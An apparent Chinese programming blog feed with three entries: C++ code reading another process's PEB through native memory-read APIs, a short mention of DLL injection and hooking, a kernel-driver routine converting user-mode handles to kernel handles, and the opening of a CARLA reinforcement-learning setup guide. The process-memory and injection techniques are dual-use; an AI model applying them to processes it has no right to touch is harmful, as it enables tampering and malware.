</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span> NGF, <span class="type">int</span> A&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_PEB_T</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">typedef</span> T type;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">struct</span></span><br><span class="line">        &#123;</span><br><span class="line">            BYTE InheritedAddressSpace;</span><br><span class="line">            BYTE ReadImageFileExecOptions;</span><br><span class="line">            BYTE BeingDebugged;</span><br><span class="line">            BYTE BitField;</span><br><span class="line">        &#125;;</span><br><span class="line">        T dummy01;</span><br><span class="line">    &#125;;</span><br><span class="line">    T Mutant;</span><br><span class="line">    T ImageBaseAddress;</span><br><span class="line">    T Ldr;</span><br><span class="line">    T ProcessParameters;</span><br><span class="line">    T SubSystemData;</span><br><span class="line">    T ProcessHeap;</span><br><span class="line">    T FastPebLock;</span><br><span class="line">    T AtlThunkSListPtr;</span><br><span class="line">    T IFEOKey;</span><br><span class="line">    T CrossProcessFlags;</span><br><span class="line">    T UserSharedInfoPtr;</span><br><span class="line">    DWORD SystemReserved;</span><br><span class="line">    DWORD AtlThunkSListPtr32;</span><br><span class="line">    T ApiSetMap;</span><br><span class="line">    T TlsExpansionCounter;</span><br><span class="line">    T TlsBitmap;</span><br><span class="line">    DWORD TlsBitmapBits[<span class="number">2</span>];</span><br><span class="line">    T ReadOnlySharedMemoryBase;</span><br><span class="line">    T HotpatchInformation;</span><br><span class="line">    T ReadOnlyStaticServerData;</span><br><span class="line">    T AnsiCodePageData;</span><br><span class="line">    T OemCodePageData;</span><br><span class="line">    T UnicodeCaseTableData;</span><br><span class="line">    DWORD NumberOfProcessors;</span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        DWORD NtGlobalFlag;</span><br><span class="line">        NGF dummy02;</span><br><span class="line">    &#125;;</span><br><span class="line">    LARGE_INTEGER CriticalSectionTimeout;</span><br><span class="line">    T HeapSegmentReserve;</span><br><span class="line">    T HeapSegmentCommit;</span><br><span class="line">    T HeapDeCommitTotalFreeThreshold;</span><br><span class="line">    T HeapDeCommitFreeBlockThreshold;</span><br><span class="line">    DWORD NumberOfHeaps;</span><br><span class="line">    DWORD MaximumNumberOfHeaps;</span><br><span class="line">    T ProcessHeaps;</span><br><span class="line">    T GdiSharedHandleTable;</span><br><span class="line">    T ProcessStarterHelper;</span><br><span class="line">    T GdiDCAttributeList;</span><br><span class="line">    T LoaderLock;</span><br><span class="line">    DWORD OSMajorVersion;</span><br><span class="line">    DWORD OSMinorVersion;</span><br><span class="line">    WORD OSBuildNumber;</span><br><span class="line">    WORD OSCSDVersion;</span><br><span class="line">    DWORD OSPlatformId;</span><br><span class="line">    DWORD ImageSubsystem;</span><br><span class="line">    DWORD ImageSubsystemMajorVersion;</span><br><span class="line">    T ImageSubsystemMinorVersion;</span><br><span class="line">    T ActiveProcessAffinityMask;</span><br><span class="line">    T GdiHandleBuffer[A];</span><br><span class="line">    T PostProcessInitRoutine;</span><br><span class="line">    T TlsExpansionBitmap;</span><br><span class="line">    DWORD TlsExpansionBitmapBits[<span class="number">32</span>];</span><br><span class="line">    T SessionId;</span><br><span class="line">    ULARGE_INTEGER AppCompatFlags;</span><br><span class="line">    ULARGE_INTEGER AppCompatFlagsUser;</span><br><span class="line">    T pShimData;</span><br><span class="line">    T AppCompatInfo;</span><br><span class="line">    _UNICODE_STRING_T&lt;T&gt; CSDVersion;</span><br><span class="line">    T ActivationContextData;</span><br><span class="line">    T ProcessAssemblyStorageMap;</span><br><span class="line">    T SystemDefaultActivationContextData;</span><br><span class="line">    T SystemAssemblyStorageMap;</span><br><span class="line">    T MinimumStackCommit;</span><br><span class="line">    T FlsCallback;</span><br><span class="line">    _LIST_ENTRY_T&lt;T&gt; FlsListHead;</span><br><span class="line">    T FlsBitmap;</span><br><span class="line">    DWORD FlsBitmapBits[<span class="number">4</span>];</span><br><span class="line">    T FlsHighIndex;</span><br><span class="line">    T WerRegistrationData;</span><br><span class="line">    T WerShipAssertPtr;</span><br><span class="line">    T pContextData;</span><br><span class="line">    T pImageHeaderHash;</span><br><span class="line">    T TracingFlags;</span><br><span class="line">    T CsrServerReadOnlySharedMemoryBase;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> _PEB_T&lt;DWORD, DWORD64, <span class="number">34</span>&gt; _PEB32;</span><br><span class="line"><span class="keyword">typedef</span> _PEB_T&lt;DWORD64, DWORD, <span class="number">30</span>&gt; _PEB64;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_STRING_32</span></span><br><span class="line">&#123;</span><br><span class="line">    WORD Length;</span><br><span class="line">    WORD MaximumLength;</span><br><span class="line">    UINT32 Buffer;</span><br><span class="line">&#125; STRING32, *PSTRING32;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_STRING_64</span></span><br><span class="line">&#123;</span><br><span class="line">    WORD Length;</span><br><span class="line">    WORD MaximumLength;</span><br><span class="line">    UINT64 Buffer;</span><br><span class="line">&#125; STRING64, *PSTRING64;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_RTL_DRIVE_LETTER_CURDIR_32</span></span><br><span class="line">&#123;</span><br><span class="line">    WORD Flags;</span><br><span class="line">    WORD Length;</span><br><span class="line">    ULONG TimeStamp;</span><br><span class="line">    STRING32 DosPath;</span><br><span class="line">&#125; RTL_DRIVE_LETTER_CURDIR32, *PRTL_DRIVE_LETTER_CURDIR32;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_RTL_DRIVE_LETTER_CURDIR_64</span></span><br><span class="line">&#123;</span><br><span class="line">    WORD Flags;</span><br><span class="line">    WORD Length;</span><br><span class="line">    ULONG TimeStamp;</span><br><span class="line">    STRING64 DosPath;</span><br><span class="line">&#125; RTL_DRIVE_LETTER_CURDIR64, *PRTL_DRIVE_LETTER_CURDIR64;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING_32</span></span><br><span class="line">&#123;</span><br><span class="line">    WORD Length;</span><br><span class="line">    WORD MaximumLength;</span><br><span class="line">    UINT32 Buffer;</span><br><span class="line">&#125; UNICODE_STRING32, *PUNICODE_STRING32;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING_64</span></span><br><span class="line">&#123;</span><br><span class="line">    WORD Length;</span><br><span class="line">    WORD MaximumLength;</span><br><span class="line">    UINT64 Buffer;</span><br><span class="line">&#125; UNICODE_STRING64, *PUNICODE_STRING64;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_CURDIR_32</span></span><br><span class="line">&#123;</span><br><span class="line">    UNICODE_STRING32 DosPath;</span><br><span class="line">    UINT32 Handle;</span><br><span class="line">&#125; CURDIR32, *PCURDIR32;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_RTL_USER_PROCESS_PARAMETERS_32</span></span><br><span class="line">&#123;</span><br><span class="line">    ULONG MaximumLength;</span><br><span class="line">    ULONG Length;</span><br><span class="line">    ULONG Flags;</span><br><span class="line">    ULONG DebugFlags;</span><br><span class="line">    UINT32 ConsoleHandle;</span><br><span class="line">    ULONG ConsoleFlags;</span><br><span class="line">    UINT32 StandardInput;</span><br><span class="line">    UINT32 StandardOutput;</span><br><span class="line">    UINT32 StandardError;</span><br><span class="line">    CURDIR32 CurrentDirectory;</span><br><span class="line">    UNICODE_STRING32 DllPath;</span><br><span class="line">    UNICODE_STRING32 ImagePathName;</span><br><span class="line">    UNICODE_STRING32 CommandLine;</span><br><span class="line">    UINT32 Environment;</span><br><span class="line">    ULONG StartingX;</span><br><span class="line">    ULONG StartingY;</span><br><span class="line">    ULONG CountX;</span><br><span class="line">    ULONG CountY;</span><br><span class="line">    ULONG CountCharsX;</span><br><span class="line">    ULONG CountCharsY;</span><br><span class="line">    ULONG FillAttribute;</span><br><span class="line">    ULONG WindowFlags;</span><br><span class="line">    ULONG ShowWindowFlags;</span><br><span class="line">    UNICODE_STRING32 WindowTitle;</span><br><span class="line">    UNICODE_STRING32 DesktopInfo;</span><br><span class="line">    UNICODE_STRING32 ShellInfo;</span><br><span class="line">    UNICODE_STRING32 RuntimeData;</span><br><span class="line">    RTL_DRIVE_LETTER_CURDIR32 CurrentDirectores[<span class="number">32</span>];</span><br><span class="line">    ULONG EnvironmentSize;</span><br><span class="line">&#125; RTL_USER_PROCESS_PARAMETERS32, *PRTL_USER_PROCESS_PARAMETERS32;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_CURDIR_64</span></span><br><span class="line">&#123;</span><br><span class="line">    UNICODE_STRING64 DosPath;</span><br><span class="line">    UINT64 Handle;</span><br><span class="line">&#125; CURDIR64, *PCURDIR64;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_RTL_USER_PROCESS_PARAMETERS_64</span></span><br><span class="line">&#123;</span><br><span class="line">    ULONG MaximumLength;</span><br><span class="line">    ULONG Length;</span><br><span class="line">    ULONG Flags;</span><br><span class="line">    ULONG DebugFlags;</span><br><span class="line">    UINT64 ConsoleHandle;</span><br><span class="line">    ULONG ConsoleFlags;</span><br><span class="line">    UINT64 StandardInput;</span><br><span class="line">    UINT64 StandardOutput;</span><br><span class="line">    UINT64 StandardError;</span><br><span class="line">    CURDIR64 CurrentDirectory;</span><br><span class="line">    UNICODE_STRING64 DllPath;</span><br><span class="line">    UNICODE_STRING64 ImagePathName;</span><br><span class="line">    UNICODE_STRING64 CommandLine;</span><br><span class="line">    UINT64 Environment;</span><br><span class="line">    ULONG StartingX;</span><br><span class="line">    ULONG StartingY;</span><br><span class="line">    ULONG CountX;</span><br><span class="line">    ULONG CountY;</span><br><span class="line">    ULONG CountCharsX;</span><br><span class="line">    ULONG CountCharsY;</span><br><span class="line">    ULONG FillAttribute;</span><br><span class="line">    ULONG WindowFlags;</span><br><span class="line">    ULONG ShowWindowFlags;</span><br><span class="line">    UNICODE_STRING64 WindowTitle;</span><br><span class="line">    UNICODE_STRING64 DesktopInfo;</span><br><span class="line">    UNICODE_STRING64 ShellInfo;</span><br><span class="line">    UNICODE_STRING64 RuntimeData;</span><br><span class="line">    RTL_DRIVE_LETTER_CURDIR64 CurrentDirectores[<span class="number">32</span>];</span><br><span class="line">    ULONG EnvironmentSize;</span><br><span class="line">&#125; RTL_USER_PROCESS_PARAMETERS64, *PRTL_USER_PROCESS_PARAMETERS64;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PROCESS_BASIC_INFORMATION64</span> &#123;</span><br><span class="line">    NTSTATUS ExitStatus;</span><br><span class="line">    UINT32 Reserved0;</span><br><span class="line">    UINT64 PebBaseAddress;</span><br><span class="line">    UINT64 AffinityMask;</span><br><span class="line">    UINT32 BasePriority;</span><br><span class="line">    UINT32 Reserved1;</span><br><span class="line">    UINT64 UniqueProcessId;</span><br><span class="line">    UINT64 InheritedFromUniqueProcessId;</span><br><span class="line">&#125; PROCESS_BASIC_INFORMATION64;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PROCESS_BASIC_INFORMATION32</span> &#123;</span><br><span class="line">    NTSTATUS ExitStatus;</span><br><span class="line">    UINT32 PebBaseAddress;</span><br><span class="line">    UINT32 AffinityMask;</span><br><span class="line">    UINT32 BasePriority;</span><br><span class="line">    UINT32 UniqueProcessId;</span><br><span class="line">    UINT32 InheritedFromUniqueProcessId;</span><br><span class="line">&#125; PROCESS_BASIC_INFORMATION32;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> endregion</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">HANDLE m_ProcessHandle = </span><br><span class="line"><span class="built_in">OpenProcess</span>(</span><br><span class="line">PROCESS_ALL_ACCESS,<span class="comment">// 所有权限</span></span><br><span class="line">FALSE,<span class="comment">// 不继承句柄</span></span><br><span class="line"><span class="number">8016</span><span class="comment">// 进程ID，此处为了方便直接写死</span></span><br><span class="line">);</span><br><span class="line"> </span><br><span class="line">    BOOL bSource = FALSE;<span class="comment">// 判断自身进程是否为 64位</span></span><br><span class="line">    BOOL bTarget = FALSE;<span class="comment">// 判断目标进程是否为 64位</span></span><br><span class="line">    <span class="built_in">IsWow64Process</span>(</span><br><span class="line"><span class="built_in">GetCurrentProcess</span>(),<span class="comment">// 进程句柄</span></span><br><span class="line">&amp;bSource<span class="comment">// 用来接收返回值的变量，64位 FLASE | 32位 TRUE</span></span><br><span class="line">);</span><br><span class="line">    <span class="built_in">IsWow64Process</span>(</span><br><span class="line">m_ProcessHandle,<span class="comment">// 进程句柄</span></span><br><span class="line">&amp;bTarget<span class="comment">// 用来接收返回值的变量，64位 FLASE | 32位 TRUE</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 目标 64位，自身 32位</span></span><br><span class="line">    <span class="keyword">if</span>(bTarget == FALSE &amp;&amp; bSource == TRUE)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="comment">// 获取 ntdll.dll 模块句柄</span></span><br><span class="line">        HMODULE NtdllModule = <span class="built_in">GetModuleHandle</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">pfnNtWow64QueryInformationProcess64 NtWow64QueryInformationProcess64 = (pfnNtWow64QueryInformationProcess64)<span class="built_in">GetProcAddress</span>(NtdllModule,<span class="string">&quot;NtWow64QueryInformationProcess64&quot;</span>);</span><br><span class="line">pfnNtWow64ReadVirtualMemory64 NtWow64ReadVirtualMemory64 = (pfnNtWow64ReadVirtualMemory64)<span class="built_in">GetProcAddress</span>(NtdllModule,<span class="string">&quot;NtWow64ReadVirtualMemory64&quot;</span>);</span><br><span class="line">        PROCESS_BASIC_INFORMATION64 pbi = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        UINT64 ReturnLength = <span class="number">0</span>;</span><br><span class="line">        NTSTATUS Status = <span class="built_in">NtWow64QueryInformationProcess64</span>(m_ProcessHandle,ProcessBasicInformation,&amp;pbi,(UINT32)<span class="built_in">sizeof</span>(pbi),(UINT32*)&amp;ReturnLength);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status))&#123;</span><br><span class="line">            _PEB64* Peb = (_PEB64*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(_PEB64));</span><br><span class="line">            RTL_USER_PROCESS_PARAMETERS64* ProcessParameters = (RTL_USER_PROCESS_PARAMETERS64*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(RTL_USER_PROCESS_PARAMETERS64));</span><br><span class="line">            Status = <span class="built_in">NtWow64ReadVirtualMemory64</span>(m_ProcessHandle,(PVOID64)pbi.PebBaseAddress,(_PEB64*)Peb,<span class="built_in">sizeof</span>(_PEB64),&amp;ReturnLength);</span><br><span class="line"></span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;PEB地址:&quot;</span> &lt;&lt; std::hex &lt;&lt; pbi.PebBaseAddress &lt;&lt; std::endl;</span><br><span class="line">            <span class="comment">//cout &lt;&lt; &quot;Ldr:&quot; &lt;&lt; hex &lt;&lt; Peb-&gt;Ldr &lt;&lt; endl;</span></span><br><span class="line">            <span class="comment">//cout &lt;&lt; &quot;ImageBaseAddress:&quot; &lt;&lt; hex &lt;&lt; Peb-&gt;ImageBaseAddress &lt;&lt; endl;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 目标 32位，自身 32位</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (bTarget == TRUE &amp;&amp; bSource == TRUE)</span><br><span class="line">    &#123;</span><br><span class="line">        HMODULE NtdllModule = <span class="built_in">GetModuleHandle</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">        pfnNtQueryInformationProcess NtQueryInformationProcess = (pfnNtQueryInformationProcess)<span class="built_in">GetProcAddress</span>(NtdllModule,<span class="string">&quot;NtQueryInformationProcess&quot;</span>);</span><br><span class="line">        PROCESS_BASIC_INFORMATION32 pbi = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        UINT32  ReturnLength = <span class="number">0</span>;</span><br><span class="line">        NTSTATUS Status = <span class="built_in">NtQueryInformationProcess</span>(m_ProcessHandle,ProcessBasicInformation,&amp;pbi,(UINT32)<span class="built_in">sizeof</span>(pbi),(UINT32*)&amp;ReturnLength);</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status))&#123;</span><br><span class="line">            _PEB32* Peb = (_PEB32*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(_PEB32));</span><br><span class="line">            <span class="built_in">ReadProcessMemory</span>(m_ProcessHandle, (PVOID)pbi.PebBaseAddress,(_PEB32*)Peb,<span class="built_in">sizeof</span>(_PEB32),<span class="literal">NULL</span>);</span><br><span class="line">           </span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;PEB地址:&quot;</span> &lt;&lt; std::hex &lt;&lt; pbi.PebBaseAddress &lt;&lt; std::endl;</span><br><span class="line">            <span class="comment">//printf(&quot;LdrAddress:%x\r\n&quot;, ((_PEB32*)Peb)-&gt;Ldr);</span></span><br><span class="line">            <span class="comment">//printf(&quot;ImageBaseAddress:%x\r\n&quot;, ((_PEB32*)Peb)-&gt;ImageBaseAddress);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">getchar</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="4-注入"><a href="#4-注入" class="headerlink" title="4. 注入"></a>4. 注入</h1><p>对目标进程进行DLL注入，Hook <code>GetMoudleHandle</code>、<code>Loadlibary</code>等函数，让目标进程自己调用，进行IPC通信。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb">PEB （winternl.h） - Win32 应用 |Microsoft 学习</a></p><p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data">PEB_LDR_DATA （winternl.h） - Win32 应用 |Microsoft 学习</a></p><p><a href="https://www.cnblogs.com/bokernb/p/6404795.html">PEB及LDR链 - bokernb - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/lunatic7/article/details/124460261">远程获取进程DLL模块地址_获取进程模块-CSDN博客</a></p><p><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot">CreateToolhelp32Snapshot 函数 (tlhelp32.h) - Win32 apps | Microsoft Learn</a></p><p><a href="https://learn.microsoft.com/zh-cn/windows/win32/psapi/enumerating-all-modules-for-a-process">枚举进程的所有模块 - Win32 apps | Microsoft Learn</a></p>]]></content>
      
      
      <categories>
          
          <category> Windows Programming </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>目标进程用户模式句柄转换为内核句柄</title>
      <link href="/2024/02/04/%E7%9B%AE%E6%A0%87%E8%BF%9B%E7%A8%8B%E7%94%A8%E6%88%B7%E6%A8%A1%E5%BC%8F%E5%8F%A5%E6%9F%84%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%86%85%E6%A0%B8%E5%8F%A5%E6%9F%84/"/>
      <url>/2024/02/04/%E7%9B%AE%E6%A0%87%E8%BF%9B%E7%A8%8B%E7%94%A8%E6%88%B7%E6%A8%A1%E5%BC%8F%E5%8F%A5%E6%9F%84%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%86%85%E6%A0%B8%E5%8F%A5%E6%9F%84/</url>
      
        <content type="html"><![CDATA[<h1 id="目标进程用户模式句柄转换为内核句柄"><a href="#目标进程用户模式句柄转换为内核句柄" class="headerlink" title="目标进程用户模式句柄转换为内核句柄"></a>目标进程用户模式句柄转换为内核句柄</h1><p>网上很多方法都是Ring0内核进程和句柄互相转换的方法，查了一下没怎么看到说怎么将用户模式句柄转换为内核句柄的。如果内核获取到的是<strong>目标进程的句柄</strong>，拷贝到内核模式是不能直接使用的，会引发异常。</p><p>目前想到的实现思路是：</p><ol><li>如果是伪句柄，直接返回后面再来处理。</li><li>调用<code>ObReferenceObjectByHandle</code>指定用户模式句柄获取任意对象的体指针  （EProcess、EThread ）</li><li>调用<code>ObOpenObjectByPointer</code>打开指针所引用的对象，并返回对象的句柄，此时设置为内核句柄。就获取到啦。</li></ol><p>本人是菜鸟，各位师傅如果知道其他的方法跪求指点！！！</p><p>实现代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS <span class="title function_">ConvertKernelHandle</span><span class="params">(</span></span><br><span class="line"><span class="params">    IN HANDLE    UserHandle,</span></span><br><span class="line"><span class="params">    OUT PHANDLE  KernelHandle,</span></span><br><span class="line"><span class="params">    POBJECT_TYPE ObjectType</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">    NTSTATUS Status = STATUS_SUCCESS;</span><br><span class="line">    PVOID    Object = <span class="literal">NULL</span>;   <span class="comment">//任意对象的体指针  EProcess   EThread  </span></span><br><span class="line">    LONG     v1 = (LONG)UserHandle;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (KernelHandle == <span class="literal">NULL</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        Status = STATUS_INVALID_PARAMETER;</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (v1 &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        *KernelHandle = UserHandle;</span><br><span class="line">        Status = STATUS_SUCCESS;</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Status = ObReferenceObjectByHandle(</span><br><span class="line">        UserHandle,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        ObjectType,</span><br><span class="line">        UserMode,</span><br><span class="line">        &amp;Object,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Status != STATUS_SUCCESS) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Status = ObOpenObjectByPointer(</span><br><span class="line">        Object,</span><br><span class="line">        OBJ_KERNEL_HANDLE,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        KernelMode,</span><br><span class="line">        KernelHandle</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*KernelHandle == UserHandle) &#123;</span><br><span class="line">        Status = STATUS_UNSUCCESSFUL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">Exit:</span><br><span class="line">    <span class="keyword">if</span> (Object != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        ObDereferenceObject(Object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>伪句柄转换为真实句柄，可以调用复制对象句柄的<code>DuplicateHandle</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">DuplicateHandle</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  HANDLE   hSourceProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  HANDLE   hSourceHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  HANDLE   hTargetProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out] LPHANDLE lpTargetHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  DWORD    dwDesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  BOOL     bInheritHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  DWORD    dwOptions</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>微软官方在对此函数的解释中，说明了如果 <em>hSourceHandle</em> 是伪句柄， 会将其转换为进程或线程的实际句柄。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/ntifs/nf-ntifs-obopenobjectbypointer">ObOpenObjectByPointer 函数 (ntifs.h) - Windows drivers | Microsoft Learn</a></p><p><a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/nf-wdm-obreferenceobjectbyhandle">ObReferenceObjectByHandle 函数 (wdm.h) - Windows drivers | Microsoft Learn</a></p><p><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/handleapi/nf-handleapi-duplicatehandle">DuplicateHandle 函数 (handleapi.h) - Win32 apps | Microsoft Learn</a></p><p><a href="https://www.cnblogs.com/lsh123/p/7350496.html">伪句柄转换为真正的句柄 - 沉疴 - 博客园 (cnblogs.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> Windows Kernel </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>基于CALRA和DQN实现自动驾驶的仿真</title>
      <link href="/2024/02/04/%E5%9F%BA%E4%BA%8ECALRA%E5%92%8CDQN%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6%E7%9A%84%E4%BB%BF%E7%9C%9F/"/>
      <url>/2024/02/04/%E5%9F%BA%E4%BA%8ECALRA%E5%92%8CDQN%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6%E7%9A%84%E4%BB%BF%E7%9C%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="基于carla与DQN实现自动驾驶的仿真"><a href="#基于carla与DQN实现自动驾驶的仿真" class="headerlink" title="基于carla与DQN实现自动驾驶的仿真"></a>基于carla与DQN实现自动驾驶的仿真</h1><hr><h2 id="1-安装"><a href="#1-安装" class="headerlink" title="1. 安装"></a>1. 安装</h2><h3 id="1-1-配置虚拟环境"><a href="#1-1-配置虚拟环境" class="headerlink" title="1.1 配置虚拟环境"></a>1.1 配置虚拟环境</h3><p>在anaconda prompt逐条运行下面命令，单独配置虚拟环境。car是名字，可以自己取，但是python必须是3.7。创建好后使用pip命令下载配置所有的库（方便换源，conda换源不太方便）。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">conda create -n car python=3.7</span><br><span class="line">conda activate car</span><br><span class="line">pip install carla,pygame,numpy</span><br></pre></td></tr></table></figure><h3 id="1-2-配置carla模拟器"><a href="#1-2-配置carla模拟器" class="headerlink" title="1.2 配置carla模拟器"></a>1.2 配置carla模拟器</h3><p><a href="http://carla.org/">CARLA Simulator</a> 